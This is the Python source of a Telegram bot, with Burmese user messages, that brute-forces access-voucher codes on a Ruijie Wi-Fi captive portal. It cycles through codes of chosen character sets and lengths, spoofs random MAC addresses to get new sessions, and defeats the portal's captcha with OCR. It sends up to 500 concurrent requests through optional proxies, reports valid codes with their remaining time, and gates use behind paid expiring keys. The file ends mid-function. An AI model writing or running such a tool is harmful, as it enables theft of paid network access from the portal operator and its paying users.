import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, itertools, signal, logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import asyncio_helper
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Logging setup ─────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
ADMIN_ID     = os.environ.get("ADMIN_ID", "")
REPO_OWNER   = os.environ.get("REPO_OWNER", "")
REPO_NAME    = os.environ.get("REPO_NAME", "")
# Optional proxy — supports http://, socks4://, socks5://
# Example: socks5://user:pass@host:1080  or  http://host:8080
PROXY_URL    = os.environ.get("PROXY_URL", "")

def validate_env():
    """Startup တွင် required env vars စစ်ဆေးသည်"""
    missing = [v for v in ["BOT_TOKEN","GITHUB_TOKEN","ADMIN_ID","REPO_OWNER","REPO_NAME"]
               if not os.environ.get(v)]
    if missing:
        raise SystemExit(f"❌ Missing environment variables: {', '.join(missing)}")
    logger.info("✅ All environment variables loaded.")

# ── Domain config ─────────────────────────────────────────────────────────
PORTAL_HOST = "portal-mm-as.ruijienetworks.com"
PORTAL_BASE = f"https://{PORTAL_HOST}"

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE   = asyncio.Queue()
bot            = AsyncTeleBot(BOT_TOKEN)

# ── Proxy setup for Telegram API requests ────────────────────────────────
if PROXY_URL:
    asyncio_helper.proxy = PROXY_URL

user_data      = {}
approve        = {}
scan_tasks     = {}
success_texts  = {}
limited_texts  = {}
captcha_state  = {}

notify_setting  = {}
DEFAULT_NOTIFY  = True
last_scan_params = {}
pending_brute   = {}
success_messages = {}
limited_messages = {}

session     = None
_connector  = None
CONCURRENCY = 500
_voucher_sem = None
_start_time  = time.monotonic()

# ── Web server (Railway health check & keep-alive) ─────────────────────────
async def handle(request):
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600)
    m, s = divmod(r, 60)
    return web.Response(text=f"✅ Bot running | Uptime: {h}h {m}m {s}s")

async def handle_health(request):
    return web.Response(text="ok", status=200)

async def web_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle)
        app.router.add_get('/health', handle_health)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"✅ Web server started on port {port}")
    except Exception as e:
        logger.error(f"❌ Web server error: {e}")

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
        return {}, None
    except Exception as e:
        logger.error(f"[get_file_content] error: {e}")
        return {}, None

async def update_file_content(path, content, sha, message):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Content-Type": "application/json"
        }
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {"message": message, "content": encoded, "sha": sha}
        async with session.put(url, headers=headers, json=payload) as response:
            return await response.text()
    except Exception as e:
        logger.error(f"[update_file_content] error: {e}")
        return None

# ── Helper functions ───────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        logger.warning(f"Key parse error: {e}")
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':   total_seconds += val * 86400
        elif unit == 'h': total_seconds += val * 3600
        elif unit == 'm': total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':            total += val * 30 * 24 * 60
        elif unit == 'd':           total += val * 24 * 60
        elif unit == 'h':           total += val * 60
        elif unit in ('min', 'm'):  total += val
    return total

def _parse_seconds(val):
    secs  = int(val)
    hours = secs // 3600
    mins  = (secs % 3600) // 60
    if hours > 0:   return f"{hours}h {mins}m"
    elif mins > 0:  return f"{mins}m"
    return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:  return "0m"
    if total_mins < 60:  return f"{total_mins}m"
    hours = total_mins // 60
    mins  = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days      = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months   = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(token):
    url = f"http://{PORTAL_HOST}/api/auth/balance/getBalance/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/balance.html?sessionId={token}&lang=en_US&authType=15',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, cookies=cookies,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{PORTAL_BASE}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies,
                                       timeout=aiohttp.ClientTimeout(total=10)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return "N/A"
            try:
                data = json.loads(raw)
            except Exception:
                return "N/A"

            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])

            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_minutes(val)
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_seconds(val)
            return "N/A"
    except Exception as e:
        logger.error(f"[get_balance] error for {token}: {e}")
        return "N/A"

# ── Mode-based code iterator ─────────────────────────────────────────────
MODE_DESCRIPTIONS = {
    "1": ("0-9",      string.digits),
    "2": ("a-z",      string.ascii_lowercase),
    "3": ("A-Z",      string.ascii_uppercase),
    "4": ("a-zA-Z",   string.ascii_letters),
    "5": ("a-z0-9",   string.ascii_lowercase + string.digits),
}

def get_mode_charset(mode):
    if mode not in MODE_DESCRIPTIONS:
        raise ValueError(f"Unsupported mode: {mode}")
    return MODE_DESCRIPTIONS[mode][1]

def get_mode_total(mode, length):
    return len(get_mode_charset(mode)) ** length

def iter_codes(mode, length):
    chars = get_mode_charset(mode)
    for combo in itertools.product(chars, repeat=length):
        yield "".join(combo)

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if total:
        pct = (checked / total * 100) if total else 0
        lines.append(f"📊 Progress: {pct:.4f}% ({checked:,}/{total:,})")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ──────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr  = np.frombuffer(image_bytes, np.uint8)
        img    = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray   = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur   = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper() if result else None
    except Exception as e:
        logger.error(f"[_ocr_sync] error: {e}")
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except Exception:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(f'{PORTAL_BASE}/api/auth/captcha/image',
                               params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': PORTAL_HOST,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': PORTAL_BASE,
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post(f'{PORTAL_BASE}/api/auth/captcha/verify',
                                headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") is True else None

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            return "sessionId" in str(response.url)
    except Exception:
        return False

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = f"{PORTAL_BASE}/api/auth/voucher/?lang=en_US"

    response   = None
    session_id = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text  = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,
            }
            headers = {
                "authority":      PORTAL_HOST,
                "accept":         "*/*",
                "accept-language":"en-US,en;q=0.9",
                "content-type":   "application/json",
                "origin":         PORTAL_BASE,
                "referer":        f"{PORTAL_BASE}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent":     "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    try:
                        resp_json = json.loads(response)
                        logger.debug(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
                    except Exception:
                        pass
            except Exception:
                return

        if response and 'request limited' in response:
            await asyncio.sleep(random.uniform(1, 3))
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data  = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
            fetched = await get_balance(token)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_line = "\n".join([f"`{item['code']}` – ⏳ {item['plan']}" for item in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_line}", parse_mode="Markdown"
                    )
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except Exception:
                pass

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None,
                         message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total        = get_mode_total(mode, length)
    checked      = 0
    found        = 0
    last_key_check = time.monotonic()
    scan_start   = time.monotonic()

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {
                    "mode": mode, "length": length,
                    "target": target, "plan_filters": plan_filters or []
                }
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(1000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (str(chat_id) not in auth_list
                        or not check_key_expiration(auth_list[str(chat_id)])):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id,
                        message=message, plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res and not isinstance(res, Exception):
                    found += 1
                    if target and found >= target:
                        # FIX: progress_msg.edit_text() မဟုတ်ဘဲ bot.edit_message_text() သုံးသည်
                        try:
                            await bot.edit_message_text(
                                "🎯 Target reached!",
                                chat_id=chat_id, message_id=progress_msg.message_id
                            )
                        except Exception:
                            await bot.send_message(chat_id, "🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed  = time.monotonic() - scan_start
            speed    = (checked / elapsed * 60) if elapsed > 0 else 0
            text     = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception:
                    pass

        if progress_msg:
            finish_text = f"✅ Scan completed.\n🔍 Total: {checked:,}\n💎 Found: {found}"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except Exception:
                await bot.send_message(chat_id, finish_text)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code    = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                logger.error(f"Update Error: {e}")

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message,
        "Bot စတင်ပါပြီ။\n\n"
        "📖 အသုံးပြုနည်းအတွက် /help ကိုနှိပ်ပါ။"
    )

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📖 **Voucher Bot အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "**၁။ Setup:**\n"
        "`/setup <url>`\n\n"
        "**၂။ ရှာဖွေခြင်း:**\n"
        "`/brute <mode> <length> [target]`\n"
        "Mode:\n"
        "  1 = ဂဏန်းသီးသန့် (0-9)\n"
        "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "Length: 1 မှ 10\n"
        "ဥပမာ: `/brute 1 6 5`\n\n"
        "**၃။** `/status` – အခြေအနေကြည့်\n"
        "**၄။** `/stop` – ရပ်တန့်ခြင်း\n"
        "**၅။** `/resume` – ဆက်ရှာဖွေခြင်း\n"
        "**၆။** `/saved` – ရလဒ်ကြည့်ခြင်း\n"
        "**၇။** `/delete_saved` – ရလဒ်ဖျက်ခြင်း\n"
        "**၈။** `/recheck` – Success codes ပြန်စစ်ခြင်း\n"
        "**၉။** `/notify` – Notification ON/OFF"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        if check_key_expiration(auth_list[key]):
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n`/setup your_session_url`", parse_mode="Markdown")
        return
    url = args[1]
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        user_data[cid] = {'session_url': url}
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
        except Exception as e:
            logger.error(f"[setup] Failed to clear GitHub result.json: {e}")
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n"
            "`/brute <mode> <length> [target]`\n\n"
            "Mode:\n"
            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
            "Length: 1 မှ 10\n"
            "ဥပမာ: `/brute 1 6 5`",
            parse_mode="Markdown"
        )
        return

    mode = args[1]
    if mode not in MODE_DESCRIPTIONS:
        await bot.reply_to(message, "Mode သည် 1-5 အတွင်း ဖြစ်ရပါမည်။\n/help ကြည့်ပါ။")
        return

    try:
        length = int(args[2])
        if length < 1 or length > 10:
            await bot.reply_to(message, "Length သည် 1 မှ 10 အတွင်း ဖြစ်ရပါမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "Length သည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("Resume", callback_data="resume_scan"),
            InlineKeyboardButton("New Scan", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode, "length": length,
                                   "target": target, "plan_filters": []}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev['length']}, target: {prev['target']}).\n"
            f"ပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message, plan_filters=[])

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    mode_desc    = MODE_DESCRIPTIONS[mode][0]
    total        = get_mode_total(mode, length)
    info = f"Mode: {mode} ({mode_desc}) | Length: {length} | Total: {total:,}"
    if target:
        info += f" | Target: {target}"
    progress_msg = await bot.send_message(chat_id, f"Preparing...\n{info}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message,
            progress_msg=progress_msg, plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'],
                            params['target'], message,
                            plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။",
                                        chat_id=chat_id,
                                        message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။",
                                     chat_id=chat_id,
                                     message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'],
                                params['target'], call.message,
                                plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။",
                                         chat_id=chat_id,
                                         message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'],
                                    params['target'], call.message,
                                    plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။",
                                         chat_id=chat_id,
                                         message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c    = item["code"]
            plan = item.get("plan", "N/A")
            parts.append(f"`{c}` – ⏳ {plan}")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    MAX = 4096
    if len(full_text) > MAX:
        for i in range(0, len(full_text), MAX):
            await bot.send_message(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ဖျက်ရန် code မရှိပါ။")
        return

    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Delete codes for {chat_id}")
    except Exception as e:
        logger.error(f"[delete_saved] GitHub error: {e}")

    await bot.reply_to(message, "🗑️ Saved codes အားလုံး ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
